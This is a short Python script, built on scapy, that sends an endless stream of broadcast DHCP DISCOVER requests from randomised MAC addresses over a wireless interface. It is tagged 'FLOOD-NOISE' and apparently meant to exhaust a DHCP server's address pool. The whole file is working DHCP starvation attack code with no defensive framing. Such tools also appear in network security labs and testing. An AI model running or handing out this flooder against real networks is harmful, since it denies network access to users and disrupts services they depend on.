#!/usr/bin/env python3
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, conf, RandMAC
from scapy.utils import mac2str
from time import sleep
import random
import sys

conf.checkIPaddr = False

IFACE = "wlan0"
DELAY = 0.05
FLOOD_TAG = "FLOOD-NOISE"



def build_discover():
    mac = RandMAC()
    xid = random.randint(1, 0xFFFFFFFF)

    ether = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
    ip = IP(src="0.0.0.0", dst="255.255.255.255")
    udp = UDP(sport=68, dport=67)
    bootp = BOOTP(
        op=1,                 # BOOTREQUEST
        htype=1,              # Ethernet
        hlen=6,               # hardware address length
        xid=xid,              # <-- xid was generated but never used before
        flags=0x8000,         # ask the server to broadcast its reply
        chaddr=mac2str(mac),  # chaddr is a raw 16-byte field, not a string
    )
    dhcp = DHCP(options=[
        ("message-type", "discover"),
        ("vendor_class_id", FLOOD_TAG),
        ("param_req_list", [1, 3, 6, 15]),  # mask, router, DNS, domain name
        "end",
    ])

    return ether / ip / udp / bootp / dhcp, mac, xid


def main():
    count = 0
    try:
        while True:
            pkt, mac, xid = build_discover()
            sendp(pkt, iface=IFACE, verbose=0)
            count += 1
            print(f"[{count}] DISCOVER  xid=0x{xid:08x}  mac={mac}  iface={IFACE}")
            sleep(DELAY)
    except KeyboardInterrupt:
        print("\nStopped.")
        sys.exit(0)


if __name__ == "__main__":
    main()
